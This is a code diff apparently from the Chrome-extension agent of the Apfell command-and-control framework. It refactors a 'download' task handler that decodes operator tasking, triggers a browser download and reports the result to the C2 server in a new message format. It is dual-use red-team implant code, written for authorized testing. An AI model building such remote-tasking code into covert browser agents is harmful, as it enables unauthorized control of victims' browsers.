@@ -1,18 +1,15 @@
-download = function(params) {
-    let args = JSON.parse(atob(params['data'].toString()));
-    let taskid = params['taskid'];
-    let tasktype = params['tasktype'];
+download = function(task) {
+    let args = JSON.parse(atob(task['params'].toString()));
     chrome.downloads.download(args, function(downloadID){
         if (downloadID == undefined) {
             downloadID = "null (error)"
         }
-        const downloadMsg = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started download ' + downloadID}, null, 2))));
-        const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, downloadMsg.length, taskid, tasktype, downloadMsg);
-        let meta = {};
-        meta["metatype"] = 3;
-        meta["metadata"] = apfellmsg;
-        const metaenvelope = JSON.stringify(meta);
-        out.push(metaenvelope);
+        response = {'task_id':task['task_id'], 'user_output':'started download with id ' + downloadID, 'completed':true};
+        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
+        enc = JSON.stringify(outer_response);
+        final = apfell.apfellid + enc;
+        msg = btoa(unescape(encodeURIComponent(final)));
+        out.push(msg);
     });
 };
 
